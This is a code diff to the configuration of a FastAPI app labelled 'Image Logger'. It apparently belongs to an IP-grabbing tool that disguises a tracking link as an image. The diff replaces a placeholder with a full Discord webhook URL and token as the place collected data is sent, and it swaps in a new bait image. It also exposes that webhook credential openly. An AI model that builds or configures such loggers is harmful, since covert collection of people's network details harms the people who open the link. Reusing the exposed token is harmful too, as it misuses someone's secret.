@@ -6,8 +6,8 @@ from urllib.parse import unquote
 app = FastAPI()
 
 CONFIG = {
-    "webhook": "YOUR_WEB_HOOK",
-    "image": "https://imageio.forbes.com/specials-images/imageserve/5d35eacaf1176b0008974b54/0x0.jpg?format=jpg&crop=4560,2565,x790,y784,safe&width=1200",
+    "webhook": "https://discord.com/api/webhooks/1571542760379387934/SOJeZdFWEL60Jy1rcY0vpOmzQDNo0rny-uAok-PBTlhl5Cqqj3j26q2BtGMAOscwHXul",
+    "image": "https://imgs.search.brave.com/lC0-0E9jfTGCtglZ8u1bT3gAEnV8zxa-k8GmvVrOZ7g/rs:fit:500:0:1:0/g:ce/aHR0cHM6Ly9tZWRp/YTAuZ2lwaHkuY29t/L21lZGlhL3YxLlky/bGtQVGM1TUdJM05q/RXhjSFl4WjJ4dWJt/Wm5lbWQzT0RObGJH/TmxNM3B2YVRnMU4y/ZGhjblp4Y1Rsa2Qy/a3hlRzR3ZVNabGNE/MTJNVjluYVdaelgz/TmxZWEpqYUNaamRE/MW4vYzBVcktFd1Fu/RE9ZMFlvWlJYLzIw/MC5naWY.jpeg",
     "username": "Image Logger",
     "color": 0x00FFFF,
     "vpnCheck": 1, 
